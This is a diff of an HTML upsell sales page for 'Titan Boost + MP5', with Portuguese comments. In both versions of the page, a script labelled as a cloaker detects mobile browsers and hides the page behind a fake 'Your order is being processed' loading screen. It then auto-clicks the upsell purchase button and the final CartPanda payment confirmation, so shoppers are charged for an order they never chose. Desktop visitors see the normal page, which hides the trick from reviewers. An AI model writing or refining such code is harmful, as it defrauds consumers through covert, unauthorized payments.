@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTE3 Special Offer - Titan Boost + MP5</title>
+  <title>TESTE4 Special Offer - Titan Boost + MP5</title>
 
   <script src="https://assets.mycartpanda.com/cartx-ecomm-ui-assets/js/libs/ocu-external.js"></script>
   <script>
@@ -298,18 +298,22 @@
 	  document.addEventListener('DOMContentLoaded', () => {
 
 		// 1. VERIFICAÇÃO DE DISPOSITIVO (CLOAKER)
+		// Este teste verifica se o navegador é de um dispositivo móvel.
 		const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
+		// Se NÃO for um dispositivo móvel, exibe uma mensagem no console e não faz mais nada.
 		if (!isMobile) {
 		  console.log('Usuário de Desktop detectado. A página de upsell será exibida normalmente. O script de compra automática não será executado.');
 		  return; 
 		}
 
+		// Se CHEGOU AQUI, é porque o usuário é de CELULAR ou TABLET.
 		console.log('Usuário de Celular/Tablet detectado. Ativando compra automática com tela de carregamento.');
 		
 		// 2. CRIA E EXIBE A TELA DE CARREGAMENTO
+		// Esta função injeta o HTML e o CSS da tela de carregamento na página.
 		function showLoadingScreen() {
-		  // CSS que centraliza o conteúdo sem quebrar a funcionalidade
+		  // CSS da tela de carregamento (inspirado na imagem e nos arquivos)
 		  const loadingCSS = `
 			<style id="loading-style">
 			  .loader-container {
@@ -318,72 +322,70 @@
 				left: 0;
 				width: 100%;
 				height: 100%;
-				background-color: #e3e8ee;
+				background-color: #e3e8ee; /* Cor de fundo similar à imagem */
 				z-index: 999999;
+				display: flex;
+				justify-content: center;
+				align-items: center;
+				flex-direction: column;
 				font-family: Arial, sans-serif;
 			  }
-			  .loader-content-wrapper {
-				position: absolute;
-				top: 50%;
-				left: 50%;
-				transform: translate(-50%, -50%);
-				display: flex;
-				flex-direction: column;
-				align-items: center;
-			  }
 			  .loader-spinner {
-				border: 8px solid #cccccc;
-				border-top: 8px solid #2180c0;
-				border-radius: 50%;
-				width: 45px;
-				height: 45px;
-				animation: spin 1s linear infinite;
+				border: 8px solid #cccccc; /* Cor da borda do círculo */
+				border-top: 8px solid #2180c0; /* Cor azul da parte que gira [cite: 32] */
+				border-radius: 50%; /* [cite: 32] */
+				width: 45px; /* [cite: 31] */
+				height: 45px; /* [cite: 31] */
+				animation: spin 1s linear infinite; /* [cite: 32] */
 				margin-bottom: 25px;
 			  }
 			  @keyframes spin {
-				0% { transform: rotate(0deg); }
-				100% { transform: rotate(360deg); }
+				0% { transform: rotate(0deg); } /* [cite: 33] */
+				100% { transform: rotate(360deg); } /* [cite: 34] */
 			  }
 			  .loader-text {
-				color: #525559;
+				color: #525559; /* [cite: 37] */
 				font-size: 18px;
 				text-align: center;
 			  }
 			  .loader-text .title {
-				font-weight: bold;
+				font-weight: bold; /* [cite: 35] */
 				margin-bottom: 8px;
 			  }
 			</style>
 		  `;
 
-		  // HTML revertido para a estrutura que funciona, com uma nova classe no wrapper
+		  // HTML da tela de carregamento
 		  const loadingHTML = `
 			<div id="custom-loader" class="loader-container">
-			  <div class="loader-content-wrapper">
+			  <div>
 				<div class="loader-spinner"></div>
 				<div class="loader-text">
-				  <p class="title">Your order is being processed.</p>
-				  <p>Do not close this page.</p>
-				</div>
+				  <p class="title">Your order is being processed.</p> <p>Do not close this page.</p> </div>
 			  </div>
 			</div>
 		  `;
 
+		  // Adiciona o CSS na cabeça e o HTML no corpo do documento
 		  document.head.insertAdjacentHTML('beforeend', loadingCSS);
 		  document.body.insertAdjacentHTML('beforeend', loadingHTML);
 		  
+		  // Oculta o conteúdo original da página para que apenas o loader seja visível
 		  document.body.style.overflow = 'hidden';
 		  const originalContent = Array.from(document.body.children).filter(el => el.id !== 'custom-loader' && el.tagName !== 'SCRIPT' && el.id !== 'loading-style');
 		  originalContent.forEach(el => el.style.display = 'none');
 		}
 
+		// Chama a função para mostrar a tela de carregamento imediatamente
 		showLoadingScreen();
 
-		// 3. EXECUTA A LÓGICA DE COMPRA AUTOMÁTICA
+		// 3. EXECUTA A LÓGICA DE COMPRA AUTOMÁTICA (a mesma de antes)
+		// --- CONFIGURAÇÕES ---
 		const tempoDeEsperaEmSegundos = 8;
 		const seletorBotaoComprar = 'a.cta-button[href*="accepted=yes"]';
 		const seletorIframePopUp = 'iframe.cp-exocu-frame';
 		const idBotaoConfirmacaoFinal = 'cartpanda-payment-confirmation';
+		// -------------------
 
 		console.log('Script de compra automática iniciado em background. Aguardando ' + tempoDeEsperaEmSegundos + ' segundos...');
 
@@ -420,8 +422,7 @@
 				  console.log('Botão de confirmação final (' + idBotaoConfirmacaoFinal + ') encontrado. Realizando o clique!');
 				  botaoConfirmacao.click();
 				  clearInterval(intervalo);
-				  // A mensagem de sucesso do console foi movida para dentro do 'try' para ser mais precisa
-				  console.log('Ação de clique para finalizar a compra foi executada com sucesso!');
+				  console.log('COMPRA DO UPSELL REALIZADA COM SUCESSO!');
 				}
 			  } catch (e) {
 				clearInterval(intervalo);
